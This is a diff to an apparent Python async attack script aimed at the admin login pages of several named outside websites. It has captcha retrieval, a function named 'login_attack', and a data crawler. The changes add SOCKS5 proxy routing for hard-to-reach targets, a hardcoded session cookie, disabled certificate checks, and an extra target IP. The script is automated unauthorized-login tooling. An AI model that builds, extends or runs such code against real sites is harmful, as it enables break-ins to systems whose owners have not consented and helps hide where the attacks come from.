@@ -1,5 +1,6 @@
 import asyncio
 import aiohttp
+from aiohttp_socks import SocksConnector
 import time
 import json
 import common
@@ -10,6 +11,7 @@ from bs4 import BeautifulSoup
 base_captcha = "captcha"
 
 base_url = "http://www.ximimim.top:1008"
+# base_url = "https://154.91.255.180"
 # base_url = "http://www.bmavi.top"
 # base_url = "https://facai362.top"
 route_login = "/admin/common/login.shtml"
@@ -35,6 +37,11 @@ ATTEMPT_NUM = 3
 PLATFORM_ADDRESS = common.get_host_port(base_url)
 # 附件目录
 ATTACHMENT = "attachment"
+# 部分网站无法访问加入代理模式
+IS_AGENT = False  # 默认不开启代理
+# socks5_proxy_url = 'socks5://[USERNAME:PASSWORD@]PROXY_HOST:PROXY_PORT' 带密码
+socks5_proxy_url = 'socks5://127.0.0.1:10808'  # 不带密码
+socks5_connector = SocksConnector.from_url(socks5_proxy_url)
 
 
 async def get_captcha_code(session: aiohttp.ClientSession):  # 获取到正确验证码
@@ -100,6 +107,16 @@ async def login_attack(session: aiohttp.ClientSession, login: common.LoginInfo):
 # 协程函数
 async def async_craw(url):
     async with semaphore:
+        # 部分https地址无法自动设置cookie 需要手动设置一下
+        header = {
+            'Cookie': 'PHPSESSID=vj82u5m4j1nt7l7fo813rg1781'
+        }
+        tcp_connector = aiohttp.TCPConnector(verify_ssl=False)  # 忽略https校验
+        verify_ssl = True
+        connector = None
+        if IS_AGENT:
+            connector = socks5_connector
+        # connector=socks5_connector, headers=None
         async with aiohttp.ClientSession() as session:
             print('获取数据中...........')
             # 获取登录地址中的token
